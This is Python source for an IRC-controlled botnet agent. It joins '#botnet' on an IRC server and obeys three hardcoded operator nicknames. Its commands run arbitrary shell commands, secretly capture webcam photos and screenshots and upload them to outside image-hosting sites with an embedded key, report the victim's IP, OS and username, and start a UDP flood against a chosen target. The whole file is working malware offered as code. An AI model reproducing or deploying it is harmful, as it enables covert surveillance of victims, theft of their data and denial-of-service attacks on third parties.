import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
import os
import socket
import numpy as np
import cv2
import base64
from urllib.request import urlopen
import platform
from platform import platform
import pyautogui
import time
import requests
import ftplib
import requests
import random
import wmi
import threading
import getpass


#-------------------------------- system function ------------------------------------------

def upload_file(filePath):
    files = {
        'key': (None, '5cKOWn0nNVVb1J2jdiBkMOtrJ3sIbQtE'),
        'file': (filePath, open(filePath, 'rb')),
    }

    return requests.post('https://filebin.ca/upload.php',  files=files).text.split("url:")[1].strip()



def post_img(file):
    try:
        print("sending: " + file)

        files = {
            'key': (None, '5cKOWn0nNVVb1J2jdiBkMOtrJ3sIbQtE'),
            'file': (file, open(file, 'rb')),
        }
        return requests.post('https://imagebin.ca/upload.php', files=files).text.split("url:")[1].strip()
    except:
        return "http://thereisanerror"

def info():      #pour recup l'ip et l'os
    page = urlopen("http://www.monip.org/").read().decode("utf-8")
    ip = page.split("IP : ")[1].split("<br>")[0]
    return str(ip) + "::" + str(platform())+"::"+getpass.getuser()

def genRandomName(charNb=6):
    stringbuilder = ""
    for x in range(charNb):
        stringbuilder += random.choice("1234567890abcdef")
    return stringbuilder

def takePicture():
    cam = cv2.VideoCapture(0)
    for k in range(4):
        cam.read()
    rt, frame = cam.read()
    cam.release()
    img_name = genRandomName()+".png"
    cv2.imwrite(img_name, frame)
    cam.release()
    return img_name

def screenshot():
    image = pyautogui.screenshot()
    img_name = genRandomName()+".png"
    image.save(img_name)
    return img_name

def udp_flooding(target, time, c, nick):      #async pas au point pour le moment et nettement optimisable
    timeout =  time.time() + int(time)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    buffer = "1234567890abcdef"
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(buffer, (target, 80))     #sur le port 80 oui 
        sent = sent + 1
        c.notice(nick, "Attacking "+ sent +"sent packages "+ target +" at the port " + 80)


#------------------------------------ bot -------------------------------------------

class TestBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port):
        irc.bot.SingleServerIRCBot.__init__(
            self, [(server, port)], nickname, nickname)
        self.channel = channel

    def on_nicknameinuse(self, c, e):
        c.nick(c.get_nickname() + "_")

    def on_welcome(self, c, e):
        c.join(self.channel)
        print("connected")

    def on_privmsg(self, c, e):
        self.do_command(e, e.arguments[0])

    def on_pubmsg(self, c, e):
        self.do_command(e, e.arguments[0])

    def on_dccmsg(self, c, e):
        pass

    def on_dccchat(self, c, e):
        if len(e.arguments) != 2:
            return
        args = e.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, cmd):           #bot mainloop
        nick = e.source.nick
        #print(nick + ": " + cmd)
        args = cmd.split(" ")
        
        if nick == "Kysan" or nick == "Loguana" or nick == "Corps":
            c = self.connection
            c.notice(nick, "ok")

            if cmd == "disconnect":
                self.disconnect()

            elif cmd == "die":
                self.die()

            elif args[0] == "cmd":
                os.system(" ".join(args[1:]))

            elif cmd == "cam":
                try:
                    file = takePicture()
                    print(file)
                    link = post_img(file)
                    c.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    c.notice(nick, "error")

            elif args[0] == "screenshot":
                try:
                    file = screenshot()
                    print(file)
                    link = post_img(file) 
                    c.notice(nick, "uploaded on: "+str(link))
                    os.system("del "+file)
                except:
                    c.notice(nick, "error")

            elif cmd == "info":
                c.notice(nick, info())

            elif cmd == "help":
                c.notice(nick, "availiable commands:")
                c.notice(nick, "disconnect, cam, screenshot, info, cmd")

            #elif args[0] == exec: a faire
            elif cmd == "getcwd":
                c.notice(nick, os.getcwd())

            elif args[0] == "cd":
                os.system("cd "+ " ".join(args[1:]))
                
            elif args[0]=="flood":
                t1 = threading.Thread(target=udp_flooding, args=(args[1], args[2], c, nick))
                t1.start()
                c.notice(nick, "started")

            else:
                c.notice(nick, "Unknow command: " + cmd)
                c.notice(nick, "type help for commands list")

#--------------------------------- start ----------------------------

def main():
    bot = TestBot("#botnet", "kysnetv1user"+genRandomName(5), "irc.root-me.org", 6667)
    bot.start()

if __name__ == "__main__":
    main()

#made by Kysan721